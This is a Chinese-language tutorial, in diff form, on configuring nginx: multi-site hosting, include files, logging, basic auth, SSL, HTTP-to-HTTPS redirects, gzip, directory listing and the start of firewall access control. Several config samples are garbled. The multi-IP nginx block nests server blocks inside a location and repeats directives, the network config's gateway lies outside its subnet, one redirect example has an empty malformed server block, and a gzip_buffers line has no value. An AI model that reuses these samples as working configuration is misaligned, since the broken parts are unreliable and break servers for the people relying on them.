@@ -1,0 +1,2014 @@
+# 1.nginx多站点配置
+
+一个nginx上可以运行多个网站。
+
+```
+有多种方式： http:// + ip/域名 + 端口 + URI 
+其中，ip/域名变了，那么网站入口就变了，端口变了，网站入口也变了，而每个网站都需要有自己的入口
+```
+
+## 方式1：多端口
+
+```bash
+[root@web01 nginx]# cat nginx.conf
+worker_processes  2;
+events{
+	worker_connections 1024;
+}
+http{
+	include       mime.types;
+    default_type  application/octet-stream;
+    charset utf-8;
+ 	# 8yy复制8行，小p黏贴
+    server {
+ 		listen     80;
+ 		server_name  localhost;
+		location /{
+			root /html/one;
+			index index.html index.htm;
+		}
+}
+	
+server {
+ 	listen       81;
+ 	server_name  localhost;
+ 	location / {
+ 		root   /html/two;
+ 		index  index.html index.htm;
+     }
+}
+  server {
+ 		listen     82;
+ 		server_name  localhost;
+ 		location / {
+ 			root   /html/three;
+ 			index  index.html index.htm;
+ 		}
+    }
+ }
+
+
+
+[root@web01 nginx]# mkdir -p /html/{one,two,three}
+[root@web01 nginx]# echo 'one' >/html/one/index.html
+[root@web01 nginx]# echo 'two' >/html/two/index.html
+[root@web01 nginx]# echo 'three' >/html/three/index.html
+# 或者给三个目录中都放个不同的网站源代码，one--yiliao   two--youxi   three--随便来个index.html即可
+# 解压指令：tar -xf youxi.tar.gz
+# 在站点根目录下没有index.html首页文件，那么直接访问网址会报403的错误。
+ 
+ 
+ 
+ 
+[root@web01 nginx]# systemctl restart nginx.service
+```
+
+多端口的这种形式，大家会发现，除了80端口对应的网站，访问的时候不需要输入端口之外，其他的网 站都需要输入端口，就比较麻烦，有些网站就说，我的能不能不加端口呢，也是可以的，我们换一个方 式，让每个网站都能用上80端口。
+
+## 方式2：多ip
+
+每个操作系统其实都可以配置多个ip地址，多个ip地址一定要手动配置昂，比如windows10，如下
+
+### 1、Windows配置多个ip地址  
+
+使用我们安装了phpstudy的那个win10主机来玩昂。 查看我的ip地址：我现在这个虚拟机用的网络是NAT模式的。
+
+添加多个ip地址：
+
+![image-20240529210214521](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240529210214521.png)
+
+![image-20240529210228015](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240529210228015.png)
+
+![image-20240529210240690](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240529210240690.png)
+
+![image-20240529210301069](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240529210301069.png)
+
+![image-20240529210313039](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240529210313039.png)
+
+![image-20240529210334739](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240529210334739.png)
+
+### 2、Linux配置多个ip
+
+```bash
+[root@web01 three]# cd /etc/sysconfig/network-scripts/
+[root@web01 network-scripts]# ls
+[root@web01 network-scripts]# vim ifcfg-ens33
+TYPE="Ethernet"
+BOOTPROTO="static"
+NAME="ens33"
+DEVICE="ens33"
+ONBOOT="yes"
+IPADDR1=192.168.61.139
+IPADDR2=192.168.61.140
+IPADDR3=192.168.61.141
+NETMASK=255.255.255.0
+GATEWAY=192.168.20.2
+DNS1=223.5.5.5       
+# 保存退出
+# 重启网卡服务：systemctl restart network，查看ip地址：
+[root@web01 network-scripts]# ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
+default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP 
+group default qlen 1000
+    link/ether 00:0c:29:37:68:fd brd ff:ff:ff:ff:ff:ff
+    inet 192.168.61.139/24 brd 192.168.61.255 scope global noprefixroute ens33
+       valid_lft forever preferred_lft forever
+    inet 192.168.61.140/24 brd 192.168.61.255 scope global secondary 
+noprefixroute ens33
+       valid_lft forever preferred_lft forever
+    inet 192.168.61.141/24 brd 192.168.61.255 scope global secondary 
+noprefixroute ens33
+       valid_lft forever preferred_lft forever
+    inet6 fe80::20c:29ff:fe37:68fd/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
+多个ip地址都配置好了。那么之前的三个网站，我们调整一下配置即可，每个网站就可以都用80端口 了。
+
+```bash
+[root@web01 nginx]# vim nginx.conf
+
+worker_processes  1;
+ events {
+    worker_connections  1024;
+ }
+http {
+    include       mime.types;
+    default_type  application/octet-stream;
+    charset utf-8;
+    server {
+        listen       80;
+        server_name  localhost;
+        location / {
+    default_type  application/octet-stream;
+    charset utf-8;
+    server {
+        listen       192.168.61.139:80;  # 直接写ip地址和端口，大家都是80端口
+    }
+    server {
+        listen      192.168.61.140:80;
+
+
+        server_name  localhost;
+        location / {
+            root   /web/one;
+            index  index.html index.htm;
+        }
+        server_name  localhost;
+        location / {
+            root   /web/two;
+            index  index.html index.htm;
+        }
+    }
+    server {
+        listen       192.168.61.141:80;
+        server_name  localhost;
+        location / {
+            root   /web/three;
+            index  index.html index.htm;
+        }
+    }
+ }
+ # 保存退出
+# 检查一下语法
+
+[root@web01 nginx]# nginx -t
+ # 重启nginx
+systemctl restart nginx
+ # 查看端口占用情况
+
+[root@web01 nginx]# netstat -lntup
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address    State   
+PID/Program name    
+tcp        0      0 192.168.61.141:80   LISTEN    2340/nginx: master  
+tcp        0      0 192.168.61.140:80   LISTEN    2340/nginx: master  
+tcp        0      0 192.168.61.139:80   LISTEN    2340/nginx: master 
+...
+ # 可以看到一个ip地址一个进程
+```
+
+### 3, 方式3：多域名
+
+```bash
+ server {
+        listen       80;
+        server_name  a.jaden.com;
+        location / {
+            root   /html/one;
+            index  index.html index.htm;
+        }
+    }
+    server {
+        listen       80;
+        server_name  b.jaden.com;
+        location / {
+            root   /html/two;
+            index  index.html index.htm;
+        }
+    }
+    server {
+        listen       80;
+    
+        server_name  c.jaden.com;
+        location / {
+            root   /html/three;
+            index  index.html index.htm;
+        }
+    }
+ #修改完配置文件之后，重启nginx
+```
+
+因为jaden.com不是我的，我们直接通过浏览器访问 www.jaden.com可能会访问别人的网站，我们现在 做实验想暂用一下这个域名，那么我们可以修改我们物理机系统的hosts文件，添加一个ip和域名的对应 关系即可，因为hosts文件的优先级比DNS服务器要高。
+
+```bash
+# C:\Windows\System32\drivers\etc\hosts
+ 192.168.61.139  a.jaden.com  b.jaden.com  c.jaden.com
+
+# cmd来ping一下域名
+ping a.jaden.com
+```
+
+然后通过浏览器访问即可，可以看到一个ip地址可以对应多个域名，一个域名可以在nginx上配置一个站 点。这也是很多网站的玩法，多个域名指向了同一个网站。
+
+自助建站服务好多都是这么玩的，他公司自己买个服务器，买个公网ip，买个域名，然后开一个自助建 站的网站，用户就可以来网站上注册账号，他就给用户分配个子域名，帮用户创建一个站点根目录， nginx上配置一下，再开一个ftp服务，让用户自己可以上传网站代码，这就搞定了，每年收个几百上千 的，也能挣钱。往往一个服务器上可能都能跑几百个网站。 那么这就有问题了，如果每来一个我们就在nginx主配置文件中添加一个server记录，那么nginx配置文 件会变得很大，很难管理，所以要换一种方式来管理配置文件，将每个人的配置都单独拆分出来即可。
+
+# 2.include配置文件
+
+```bash
+[root@web01 nginx]# cat nginx.conf
+ worker_processes  2;
+ events {
+    worker_connections  1024;
+ }
+ http {
+    include       mime.types;
+    default_type  application/octet-stream;
+    charset utf-8;
+    include /etc/nginx/conf.d/*.conf; # 加载外部以.conf结尾的配置文件，如果你的路径下没有conf.d就自行创建一个-- mkdir conf.d
+ }
+ 
+ 
+ 
+ [root@web01 conf.d]# cat d_com.conf 
+    server {
+        listen       80;
+        server_name  d.com;
+        location / {
+            root   /html/four;
+            index  index.html index.htm;
+        }
+    }
+    
+    
+    
+    
+    
+# nginx官网：www.nginx.org
+# 可以在documentation文档中找到默认站点配置方式，下面这个网站就变成了默认网站，当访问的域名nginx不能匹配到对应网站时，就自动打开下面这个网站。
+[root@web01 conf.d]# cat c_com.conf 
+    server {
+        listen       80 default_server;
+        server_name  c.com;
+        location / {
+            root   /html/three;
+            index  index.html index.htm;
+        }
+    }
+```
+
+# 3.nginx日志
+
+现在web服务器都必须要开启日志记录功能，而且记录必须超过半年，这是网络安全法规定的。 www.wangan.com/wenda/6791 
+
+之前我们也看过日志，系统的安全日志，就是ssh登录的时候我们看的，如下
+
+```bash
+[root@web01 conf.d]# cat /var/log/secure 
+```
+
+登录系统就会被记录。
+
+ web服务程序也是一样，每次有人请求我们，我们就把本次请求相关信息给记录下来，有了记录，那么 如果服务器被网络攻击了，那么我们就可以在日志中去分析是谁在什么时候攻击我们的，什么样的攻 击，哪些成功了，哪些失败了。方便我们后面进行攻击溯源。 
+
+nginx默认已经帮我们记录了日志，在 /var/log/nginx/ 目录下面。
+
+```bash
+[root@web01 conf.d]# ls /var/log/nginx/
+access.log  access.log-20230412  error.log  error.log-20230412  #每个日志是会按照当天的日期进行切割
+# 我们清空一下日志
+
+[root@web01 nginx]# > access.log
+[root@web01 nginx]# cat access.log
+
+ # 访问一下网站，再看日志
+[root@web01 nginx]# cat access.log
+192.168.61.1 - - [12/Apr/2023:15:17:44 +0800] "GET /icon/duimutou.png HTTP/1.1" 
+200 78796 "http://b.jaden.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
+AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
+# 304状态码表示客户端浏览器用的是浏览器缓存页面，所以看到后面是0，表示没有响应任何数据
+```
+
+上面是访问日志的简单查看，除了访问日志，nginx还有错误日志。
+
+## 1、错误日志
+
+```bash
+[root@web01 nginx]# cat error.log
+2023/04/12 11:34:25 [error] 2342#2342: *1 open() "/web/one/favicon.ico" failed 
+(2: No such file or directory), client: 192.168.61.1, server: localhost, request: 
+"GET /favicon.ico HTTP/1.1", host: "192.168.61.139", referrer: 
+"http://192.168.61.139/"
+#没有favicon.ico文件，可以切换到站点目录中去下载一个：wget 
+https://www.mi.com/favicon.ico
+# 还有人故意访问一个错误的路径，让你的网站报错，显示出nginx的版本。
+
+error_log /opt/nginx_error.log info;
+```
+
+##  2、访问日志
+
+```bash
+# 定制日志记录格式：这个必须配置在在server配置外面昂
+log_format compression '$remote_addr - $remote_user [$time_local] '
+                         '"$request"  $status $bytes_sent '
+                         '"$http_referer" "$http_user_agent" "$gzip_ratio"';
+
+# compression可以理解为是这个格式的名字，谁想用这个格式，谁就用这个名字来指定格式
+
+192.168.61.1 - - [12/Apr/2023:14:19:59 +0800] "GET / HTTP/1.1" 304 0 "-" 
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
+Chrome/111.0.0.0 Safari/537.36"
+
+# $remote_addr 客户端的ip地址
+# $remote_user 客户端的用户名
+# $time_local  当前时间
+# $request     请求起始行
+# $status      http状态码
+# $bytes_sent  响应资源的大小
+# $http_referer 记录资源的跳转地址
+# $http_user_agent 用户的终端信息
+# $gzip_ratio     gzip的压缩级别
+
+# 比如我们想让日志记录一下请求时间、客户端ip、请求uri、状态码、文件大小
+# vim /etc/nginx/nginx.conf
+ worker_processes  1;
+ events {
+    worker_connections  1024;
+}
+http {
+    log_format test '[$time_local] $remote_addr "$request" $status $bytes_sent';
+    include       mime.types;
+    default_type  application/octet-stream;
+    charset utf-8;
+    include /etc/nginx/conf.d/*.conf;
+ }
+
+# 每个网站都可以单独记录自己的日志
+[root@web01 nginx]# cd conf.d/
+[root@web01 conf.d]# ls
+ a.jaden.com.conf.stop  b.jaden.com.conf  c.jaden.com.conf
+[root@web01 conf.d]# vim b.jaden.com.conf 
+    server {
+        listen       80;
+        server_name  b.jaden.com;
+        access_log /opt/nginx/b.jaden.com_log test;  # test是上面指定的日志格式的名称，/opt/目录下面没有nginx目录，需要我们手动创建，这个目录是随意指定的昂，mkdir /opt/nginx，还要授权：chown nginx:nginx /opt/nginx，不然nginx用户没办法访问这个目录
+        location / {
+            root   /web/two;
+            index  index.html index.htm;
+        }
+    }
+# 改完之后，重启nginx，然后访问网站，看一下/opt/nginx目录，看看日志格式。
+
+# access_log /var/log/nginx/access.log compression;
+# access_log /opt/nginx/access.log compression; # /opt/目录需要授权，不然没办法记录进去
+
+# 注意：错误日志的格式我们是不能自定义的，顶多能修改错误日志的保存路径。
+
+#官方文档http://nginx.org/en/docs/http/ngx_http_log_module.html
+```
+
+# 4,开启basic认证
+
+有些网站会开启一个叫做basic认证的东西，basic认证叫做http基本认证，就是给我们的网站多一把 锁，防止恶意访问，比如访问一些敏感后台路径等操作。 比如我们搭建的那个游戏网站，我只想自己玩，不想让其他人玩，就可以加上个basic认证。 首先生成一个叫做htpasswd的账号密码文件，有很多在线网站就能生成，如下
+
+![image-20240530164400117](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530164400117.png)
+
+把生成的密码保存下来，比如保存到 /etc/nginx/htpasswd 文件中
+
+```bash
+vim /etc/nginx/htpasswd
+
+# 写入刚才保存的用户和密码jaden:FdHiKZYkjLx.s
+```
+
+然后修改一下nginx下的b网站的配置文件：
+
+```bash
+auth_basic "b.jaden.com";  #auth_basic表示开启这个功能，"b.jaden.com"是备注信息，随便写，一些老浏览器能看到，新浏览器都看不到备注信息了。
+auth_basic_user_file /etc/nginx/htpasswd;  # 这是账号密码存放在哪个位置
+```
+
+如下
+
+```bash
+[root@web01 nginx]# cd /etc/nginx/conf.d/
+
+[root@web01 conf.d]# ls
+a.jaden.com.conf  b.jaden.com.conf  c.jaden.com.conf
+
+[root@web01 conf.d]# vim b.jaden.com.conf 
+    server {
+        listen       80;
+        server_name  b.jaden.com;
+        access_log /opt/nginx/b.jaden.com_log jaden;
+        location / {
+            auth_basic "b.jaden.com";
+            auth_basic_user_file /etc/nginx/htpasswd;
+            root   /web/two;
+            index  index.html index.htm;
+        }
+    }
+
+# 保存之后重新启动nginx就可以
+```
+
+访问b网站效果如下：登录成功之后，在刷新页面就不会再弹出这个了。
+
+![image-20240530164540247](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530164540247.png)
+
+# 5. ssl证书配置
+
+http协议访问的网站现在默认会显示不安全，因为数据默认是明文传输的。
+
+```
+ http://huijin.wennakj.cn/index.php?id=1
+```
+
+```
+						申请证书
+一般申请证书之前需要先申请一个域名，才有资格申请证书，比如，我的域名是在阿里云上买的，那么我想申请https的证书，就需要到阿里云上去申请
+搜索SSL证书-->证书管理控制台-->SSL证书-->免费证书-->创建证书-->按照操作提交申请即可-->审核通过后下载证书
+
+```
+
+大家可以发现，下载的证书和域名是对应的，这个不能乱，每个域名只能用它的专有证书。
+
+ nginx下使用我们下载的证书
+
+```bash
+# 将证书放到opt目录的cert下，cert需要我们自己创建，其实名字随便起，一般都叫cert，表示证书的意思
+[root@web01 conf.d]# cd /opt/
+[root@web01 opt]# mkdir cert
+[root@web01 opt]# cd cert/
+[root@web01 cert]# unzip 9683539_wulaoban.top_nginx.zip 
+[root@web01 cert]# ls
+9683539_wulaoban.top.key  9683539_wulaoban.top.pem 9683539_wulaoban.top_nginx.zip 
+
+#阿里云的nginx的证书部署文档中建议如下的配置：
+#以下属性中，以ssl开头的属性表示与证书配置有关。
+server {
+    #配置HTTPS的默认访问端口为443。
+    #如果未在此处配置HTTPS的默认访问端口，可能会造成Nginx无法启动。
+    #如果您使用Nginx 1.15.0及以上版本，请使用listen 443 ssl代替listen 443和ssl on。
+    listen 443 ssl;  # http--80  https -- 443
+ 	
+ 	#填写证书绑定的域名
+    server_name <yourdomain>;
+    root html;
+    index index.html index.htm;
+ 
+ 	#填写证书文件名称
+    ssl_certificate cert/<cert-file-name>.pem;
+ 	#填写证书私钥文件名称  
+    ssl_certificate_key cert/<cert-file-name>.key;
+    
+    ssl_session_timeout 5m;
+	#表示使用的加密套件的类型
+    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;
+ #表示使用的TLS协议的类型，您需要自行评估是否配置TLSv1.1协议。
+    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;
+    
+    ssl_prefer_server_ciphers on;
+    location / {
+ 		#Web网站程序存放目录
+        root html;
+        index index.html index.htm;
+    }
+}
+
+#比如，我们按照自己的网站修改为如下内容：
+server {
+    listen 443 ssl;
+    server_name www.wulaoban.top;
+    ssl_certificate /opt/cert/9683539_wulaoban.top.pem;
+    ssl_certificate_key /opt/cert/9683539_wulaoban.top.key;
+    ssl_session_timeout 5m;
+	#表示使用的加密套件的类型
+    ssl_ciphers ECDHE-RSA-AES128-GCM-
+SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;
+ 	#表示使用的TLS协议的类型，您需要自行评估是否配置TLSv1.1协议。
+    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3; # 如果不加TLSv1.1，就删掉
+    ssl_prefer_server_ciphers on;
+    location / {
+ 		#Web网站程序存放目录
+        root /web/www.wulaoban.top;
+        index index.html index.htm;
+    }
+ }
+
+# 在/web目录下创建一个名叫www.wulaoban.top的文件夹
+```
+
+### 总结
+
+```
+第一步：申请域名，然后申请证书，把证书下载下来
+
+第二步：修改nginx对应网站的配置文件
+
+第三步：准备站点源代码
+
+#第四步：因为大家没有真实域名，所以我们还需要修改hosts文件，加一个dns解析记录
+192.168.61.139  www.wulaoban.top
+
+第五步：访问https://www.wulaoban.top/smallboll/
+另外：我们还可以把smallboll里面的文件拷贝到站点根目录中，就不用加上/smallboll/来访问了。
+```
+
+# 6,return和rewrite跳转
+
+```
+我们先把smallboll里面的文件拷贝到站点根目录中，就不用加上/smallboll/来访问了。
+
+按照上面的示例，如果把https的s去掉，就相当于去访问80端口了，https默认找的是443端口，而80端口对应的网站我们设置了默认网站，所以如果你删掉了s再访问，就看到我们的默认网站了
+
+但是你看，如果我们输入
+http://www.baidu.com，去掉了s，访问之后，会自动跳转到https://www.baidu.com
+所以，很明显，我们也需要配置这个跳转行为，不然如果用户输入错了，不小心将https输入成了http，那么就打不开你的网站。
+现在配置跳转有两种方式，之前只有个rewrite跳转，现在多了一个return跳转。
+```
+
+## 1、return
+
+```bash
+#使用return跳转
+server {
+        access_log off; # 这段配置是专门用来做跳转用的，所以日志就不用记录了，off就是关闭跳转行为的日志记录
+        listen       80;
+        server_name  www.wulaoban.top;
+        location / {
+           return       
+302 https://www.wulaoban.top$request_uri; # 当用户访问
+www.wulaoban.top的80端口时，自动跳转到https网址。
+        }
+ }
+```
+
+**演示**
+
+```bash
+[root@web01 ~]# cd /etc/nginx/conf.d/
+
+[root@web01 conf.d]# ls
+ a.jaden.com.conf  b.jaden.com.conf  c.jaden.com.conf  www.wulaoban.top.conf
+
+[root@web01 conf.d]# vim www.wulaoban.top.conf 
+# 在一个网站配置文件中，其实可以写多个server，如下
+server {
+    listen 443 ssl;
+    server_name www.wulaoban.top;
+    ssl_certificate /opt/cert/9683539_wulaoban.top.pem;
+    ssl_certificate_key /opt/cert/9683539_wulaoban.top.key;
+    ssl_session_timeout 5m;
+ #表示使用的加密套件的类型
+    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;
+ #表示使用的TLS协议的类型，您需要自行评估是否配置TLSv1.1协议。
+ ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3; # 如果不加TLSv1.1，就删掉
+ 
+    ssl_prefer_server_ciphers on;
+    location / {
+ #Web网站程序存放目录
+        root /web/www.wulaoban.top;
+        index index.html index.htm;
+    }
+ }
+ 
+ server {
+        listen       80;
+        server_name  www.wulaoban.top;
+        location / {
+            root   /web/www.wulaoban.top;
+            index  index.html index.htm;
+        }
+ }
+ # 现在的意思是，不然你是http还是https，都可以访问到我们的www.wulaoban.top这个网站，但是http访问的就是80端口，不安全的访问，https访问的是443端口，安全的访问，效果如下图
+```
+
+![image-20240530165256879](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530165256879.png)
+
+但其实我们要的并不是这样的效果，我们采用https就是想要数据传输的安全性，现在你http也能正常访 问，那就失去了https的加密意义了，我们抓包看一下效果
+
+**http:**
+
+![image-20240530165356265](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530165356265.png)
+
+**https:**
+
+![image-20240530165410252](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530165410252.png)
+
+所以我们应该让他使用http的时候自动跳转为https的访问。如下
+
+```nginx
+[root@web01 conf.d]# vim www.wulaoban.top.conf 
+# 在一个网站配置文件中，其实可以写多个server，如下
+server {
+    listen 443 ssl;
+    server_name www.wulaoban.top;
+    ssl_certificate /opt/cert/9683539_wulaoban.top.pem;
+    ssl_certificate_key /opt/cert/9683539_wulaoban.top.key;
+    
+    ssl_session_timeout 5m;
+ 	#表示使用的加密套件的类型
+    ssl_ciphers ECDHE-RSA-AES128-GCM-
+SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;
+ 	#表示使用的TLS协议的类型，您需要自行评估是否配置TLSv1.1协议。
+    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3; # 如果不加TLSv1.1，就删掉
+    
+    ssl_prefer_server_ciphers on;
+    location / {
+ 		#Web网站程序存放目录
+        root /web/www.wulaoban.top;
+        index index.html index.htm;
+    }
+ }
+ server {
+        listen       80;
+        server_name  www.wulaoban.top;
+        location / {
+            return       302 https://www.wulaoban.top$request_uri; # 跳转，302是状态码，表示重定向，也就是跳转，后面再说
+        }
+ }
+# 可以先去掉$request_uri来看看效果
+# $request_uri的意思是网址uri，这个访问http://www.wulaoban.top网址后面不管加什么内容，不管访问哪个页面路径，都直接跳转到https
+# URL: 协议(http/https):// + 主机(ip/域名) + 端口(80/443) + uri(/xx/index.html或者/xx/xx.jpg等)
+# 比如访问http://www.wulaoban.top/jaden/，会自动跳转到这个https://www.wulaoban.top/jaden/，还是这个页面，但是是https协议的
+```
+
+## 2、rewrite
+
+这个写法比return那个难理解，需要写正则，所以现在用return来玩的居多。
+
+```bash
+#使用rewrite跳转
+server {
+        access_log off;
+        listen       80;
+        server_name  www.wulaoban.top;
+        location / {
+           rewrite ^/(.*) https://www.wulaoban.top/$1 redirect;  # redirect代表302状态码，临时跳转，^代表网址https://www.wulaoban.top，/(.*)其实就是匹配uri，$1表示()中匹配到的内容，也就是.*匹配到的内容
+#  rewrite ^/(.*) https://www.wulaoban.top/$1 permanent; # permanent代表301状态码，永久跳转
+        }
+ }
+```
+
+我们配置了静态ip的这个NAT模式的虚拟机不能上网是因为被NetworkManager给干扰了，关闭一下它 即可
+
+```bash
+# 在CentOS中有NetworkManager和network两种网络管理工具,如果这两种服务都工作时会产生冲突进而导致机器无法联网。
+
+systemctl stop NetworkManager
+systemctl disable NetworkManager
+
+# 在重启网卡
+systemctl restart network
+# route -n就看到有网关了。
+```
+
+**配置额外的跳转**
+
+```nginx
+# 通过curl可以查看网址的跳转细节，如下
+curl -v http://www.jd.com
+ # 不管我们访问www.jd.com/jd.com/http://www.jd.com都会自动跳转到https://www.jd.com
+ # 所以我们还需要配置两个跳转，如下
+server {
+        listen       80;
+        server_name  www.wulaoban.top;
+        location / {
+           return       302 https://www.wulaoban.top$request_uri;
+        }
+ }
+ server {
+        listen       80;
+        }
+ }
+ server {
+        listen       80;
+        server_name  wulaoban.top;  # 用户输入不带www的时候也能跳转到https的网址上
+        location / {
+           return       302 https://www.wulaoban.top$request_uri;
+           }
+}
+```
+
+# 7.  nginx gzip压缩
+
+**nginx采用的压缩方式是gzip**
+
+```nginx
+[root@web01 ~]# cd ~
+[root@web01 ~]# ll
+总用量 4-rw------- 1 root root 1304 3月  15 20:14 anaconda-ks.cfg
+
+[root@web01 ~]# gzip anaconda-ks.cfg 
+[root@web01 ~]# ll
+总用量 4-rw------- 1 root root 747 3月  15 20:14 anaconda-ks.cfg.gz
+# 可以看到gzip压缩的文件还是小了很多的，而且原文件没有了，只剩下压缩文件了
+```
+
+**作用：为了省流量、加快传输速度。服务端的流量都是要花钱的。尤其是要做加速的网 站，比如CDN加速，都是要收取流量费的。**
+
+![image-20240530203057145](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530203057145.png)
+
+很明显，如果服务器能够做压缩，既能够省流量，又能够加快传输速度。但是我们如果自己手动给每个 文件进行压缩，就太慢了，所以我们部署Nginx的时候，一般都会给Nginx做自动压缩的配置
+
+ 将下面的所有配置全部拷贝到我们nginx的网站配置上，哪个网站需要配置，就给哪个网站配置
+
+```nginx
+gzip on;                 #开启gzip压缩
+
+gzip_min_length  1k;     #最小压缩文件，小于1KB的就不压缩了
+
+gzip_buffers     		 #内存缓冲，压缩需要提前规划一些内存空间出来，4个32KB的空间
+
+gzip_http_version 1.1;   #http版本，默认是1.0，1.1需要自己声明，不过现在比较新的nginx应该默认就是1.1了
+
+gzip_comp_level 9;       #压缩等级，等级数1-9，压缩等级越高，压缩用的时长越长，但是压缩的就越小
+
+gzip_types  text/css text/xml application/javascript;  #压缩的文件类型，这些类型的文件才会被压缩，为什么压缩的都是文本文件，而不压缩图片、视频和音频等多媒体文件呢，因为文本文件的压缩比是最高的，值得压缩。 比如jgp图片文件，这种格式的图片本身就是压缩过的文件，再压缩的意义不大。
+
+gzip_vary on;    #http响应头添加gzip标识
+
+gzip_disable "MSIE [1-7]\.";   #遇到IE浏览器1-7取消gzip压缩
+```
+
+**比如，我们给 a.jaden.com 网站进行配置压缩，配置之前我们可以先访问一下网站，在浏览器开发者工 具栏看一下流量情况**
+
+![image-20240530203346783](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530203346783.png)
+
+**配置自动压缩：**
+
+```nginx
+  server {
+        listen       80;
+        server_name  a.jaden.com;
+        access_log /opt/nginx/a.jaden.com_log jaden;
+        location / {
+ 		   # 添加到这里即可
+            gzip on;            #开启gzip压缩     
+            gzip_min_length  1k;     #最小压缩文件
+            gzip_buffers  4 32k;  #内存缓冲
+            gzip_http_version 1.1;   #http版本
+            gzip_comp_level 9;        #压缩等级
+            gzip_types  text/css text/xml application/javascript;  #压缩w类型
+            gzip_vary on;    #http响应头添加gzip标识
+            gzip_disable "MSIE [1-7]\.";   #遇到IE浏览器1-7取消gzip压缩
+            root   /web/one;
+            index  index.html index.htm;
+         }
+    }
+    
+ # 配置完重启nginx
+```
+
+**访问再看流量统计：可以看到总体资源大小还是1.3MB，传输的流量小了。为什么总体资源大小还是那 么大呢，因为浏览器收到压缩文件之后，会自动帮我们解压，解压出来之后，还是原始的文件大小。**
+
+![image-20240530203546304](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530203546304.png)
+
+**服务端我们开启了gzip压缩功能，浏览器怎么知道要解压呢？服务端要告诉浏览器：**
+
+![image-20240530203609415](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530203609415.png)
+
+**浏览器其实会告诉服务端，它自己支不支持压缩，如下**
+
+![image-20240530203640694](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530203640694.png)
+
+如果你的客户端不支持这种压缩文件或者说不支持这种压缩格式，那么服务端只能老老实实给你发送原 文件，不压缩。 
+
+而且压缩和解压缩会消耗双方的CPU性能，但是现在的CPU性能高的很，不在乎这点消耗，摩尔定律说，每个一年半或者两年，CPU的性能会增加一倍。但是现在受限于CPU的物理制作工艺，很难突破每 年性能提升一倍。
+
+# 8.  nginx 目录浏览
+
+```nginx
+# 如下两个配置即可：
+autoindex on;  # 开启目录浏览功能
+autoindex_exact_size off; #显示文件大小的时候带单位
+# 配置在nginx网站配置的server配置中：
+
+	server {
+        listen       80 default_server;
+        server_name  c.jaden.com;
+        access_log /opt/nginx/c.jaden.com_log jaden;
+        autoindex on; # 这里
+        autoindex_exact_size off; # 这里
+        location / {
+            root   /web/three;
+            index  index.html index.htm;
+        }
+}
+```
+
+**效果如下**
+
+![image-20240530203857608](D:/%E6%96%87%E6%A1%A3/%E7%AC%94%E8%AE%B0/image-20240530203857608.png)
+
+# 9. nginx 访问控制allow和deny
+
+访问控制行为无非就两种，**允许(加白)和禁止(加黑)** 
+
+访问控制有两个方式，一种是在OSI模型的四层传输层，一种是在第七层应用层。
+
+主机防火墙就是在四层 控制，nginx就是在七层控制。 
+
+演示访问控制，需要开启防火墙
+
+```nginx
+# 示例1：防火墙直接禁用ip地址，这是基于四层的效果
+# systemctl start firewalld.service  #开启主机防火墙
+# 拉黑某些ip地址：
+    # firewall-cmd --add-rich-rule='rule family=ipv4 source address="116.255.196.0/24" drop'
+     # firewall-cmd --add-rich-rule='rule family=ipv4 source address="123.44.22.55" drop'
+ # 比如查看一下当前系统远程连接了哪些ip地址
+[root@web01 conf.d]# w
+ 12:52:50 up  4:11,  3 users,  load average: 0.00, 0.01, 0.04
+ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+ root     tty1                     08:41    4:11m  0.01s  0.01s -bash
+ root     pts/0    192.168.61.1    08:52   2.00s  0.12s  0.00s w
+ root     pts/1    192.168.61.1    08:43   57:22   0.07s  0.07s -bash
+
